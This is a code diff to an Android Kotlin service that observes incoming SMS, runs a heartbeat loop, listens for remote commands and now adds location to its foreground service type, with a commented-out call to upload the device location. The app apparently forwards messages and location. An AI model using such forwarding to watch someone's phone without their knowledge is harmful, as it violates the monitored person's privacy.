@@ -83,44 +83,45 @@ class ForwarderService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (intent?.action == ACTION_STOP) {
-            stopSelf()
-            return START_NOT_STICKY
-        }
+    if (intent?.action == ACTION_STOP) {
+        stopSelf()
+        return START_NOT_STICKY
+    }
 
-        if (intent?.action == ACTION_CHECK_NOW) {
-            checkForNewSms()
-            return START_STICKY
-        }
-
-        createNotificationChannel()
-
-        val foregroundType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-        } else {
-            0
-        }
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && foregroundType != 0) {
-            startForeground(NOTIFICATION_ID, buildNotification(), foregroundType)
-        } else {
-            startForeground(NOTIFICATION_ID, buildNotification())
-        }
-
-        if (!isInitialized) {
-            isInitialized = true
-            serviceScope.launch {
-                if (prefs.lastSmsId == -1L) {
-                    prefs.lastSmsId = getLatestSmsId()
-                }
-                startObserving()
-                startHeartbeatLoop()
-                commandHandler.startListening()
-            }
-        }
-
+    if (intent?.action == ACTION_CHECK_NOW) {
+        checkForNewSms()
         return START_STICKY
     }
+
+    createNotificationChannel()
+
+    // Correct foreground type (dataSync + location)
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        val foregroundType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+
+        startForeground(NOTIFICATION_ID, buildNotification(), foregroundType)
+    } else {
+        startForeground(NOTIFICATION_ID, buildNotification())
+    }
+
+    if (!isInitialized) {
+        isInitialized = true
+        serviceScope.launch {
+            if (prefs.lastSmsId == -1L) {
+                prefs.lastSmsId = getLatestSmsId()
+            }
+            startObserving()
+            startHeartbeatLoop()
+            commandHandler.startListening()
+            
+            // Location bhi yahan se start kar sakte ho (optional)
+            // LocationHelper(this@ForwarderService).fetchAndUploadLocation()
+        }
+    }
+
+    return START_STICKY
+}
 
     private fun startHeartbeatLoop() {
         serviceScope.launch {
